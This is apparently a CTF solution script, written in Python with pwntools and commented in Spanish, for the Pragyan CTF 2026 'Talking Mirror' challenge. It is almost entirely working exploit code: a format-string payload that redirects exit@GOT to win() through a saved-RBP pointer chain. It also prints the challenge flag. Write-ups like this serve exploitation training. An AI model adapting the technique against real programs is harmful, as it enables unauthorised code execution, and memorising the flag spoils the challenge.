#!/usr/bin/env python3
"""
Talking Mirror - Exploit
Pragyan CTF 2026

Vulnerabilidad: Format String con escritura indirecta via RBP chain
Técnica: Argumentos secuenciales (no posicionales) para double-write

Stack layout:
- offset 6:  buffer[0:8]
- offset 19: canary
- offset 20: saved RBP (main_bp) - apunta a stack
- offset 21: return address
- offset 22: *(main_bp) - valor original 0x1

Exploit:
1. %n en offset 20 escribe EXIT_GOT en *(main_bp)
2. %hn en offset 22 (ahora apunta a EXIT_GOT) escribe win()
3. exit() → jmp win() → flag

Flag: p_ctf{7hETAlk!n6M!RR0RSpOkeONE7OOmANyT!m3S}
"""
from pwn import *

context.log_level = 'info'

# Constantes
EXIT_GOT = 0x400a50  # 4196944 decimal
WIN_ADDR = 0x401216  # win() function

def main():
    # Conectar al servidor remoto
    io = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)

    log.info("Conectado a talking-mirror.ctf.prgy.in:1337")

    # Calcular padding para el payload
    # Objetivo: %n escribe EXIT_GOT (4196944) en offset 20
    # Luego %hn escribe WIN_ADDR (0x1216) en offset 22

    # Paso 1: Imprimir EXIT_GOT caracteres antes de %n
    # 4196944 = 4196926 + 18
    PAD1 = EXIT_GOT - 18

    # Paso 2: Ajustar para %hn (16 bits)
    # 4196944 mod 65536 = 2640
    # Necesitamos 0x1216 = 4630
    # Diferencia: 4630 - 2640 = 1990
    PAD2 = (WIN_ADDR & 0xFFFF) - (EXIT_GOT % 65536)

    # Construir payload con argumentos SECUENCIALES
    payload = f"%{PAD1}c".encode()  # Imprimir PAD1 chars
    payload += b"%c" * 18            # Imprimir 18 chars más (args 2-19)
    payload += b"%n"                 # Escribir a *(offset 20) = *(main_bp)
    payload += f"%{PAD2}c".encode()  # Imprimir PAD2 chars más
    payload += b"%hn"                # Escribir a *(offset 22) = exit@GOT

    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Escritura 1: {EXIT_GOT} (0x{EXIT_GOT:x}) → main_bp")
    log.info(f"Escritura 2: {WIN_ADDR & 0xFFFF} (0x{WIN_ADDR & 0xFFFF:x}) → exit@GOT")

    # Enviar payload
    io.recvuntil(b'repeat it.\n')
    log.info("Enviando payload...")
    io.sendline(payload)

    # Recibir output (esto puede tomar tiempo, ~4.2MB)
    log.info("Recibiendo output (puede tomar 1-2 minutos)...")

    try:
        # Recibir en chunks para no saturar memoria
        output = b""
        while True:
            try:
                chunk = io.recv(8192, timeout=5)
                if not chunk:
                    break
                output += chunk

                # Buscar flag en el output recibido hasta ahora
                if b'p_ctf{' in output:
                    log.success("Flag encontrada en output!")
                    break

            except EOFError:
                break

        # Buscar y extraer flag
        text = output.decode(errors='ignore')

        if 'p_ctf{' in text:
            start = text.find('p_ctf{')
            end = text.find('}', start) + 1
            flag = text[start:end]

            log.success("="*60)
            log.success(f"FLAG: {flag}")
            log.success("="*60)

            # Guardar en flags.txt
            try:
                with open('/root/ctf/flags.txt', 'a') as f:
                    f.write(f"Talking Mirror (verified): {flag}\n")
                log.info("Flag guardada en /root/ctf/flags.txt")
            except:
                pass

            return flag
        else:
            log.error("Flag no encontrada en output")
            log.info(f"Output size: {len(output)} bytes")
            log.info(f"Últimos 200 chars: {text[-200:]}")

    except Exception as e:
        log.error(f"Error: {e}")
        import traceback
        traceback.print_exc()

    finally:
        io.close()

if __name__ == "__main__":
    main()
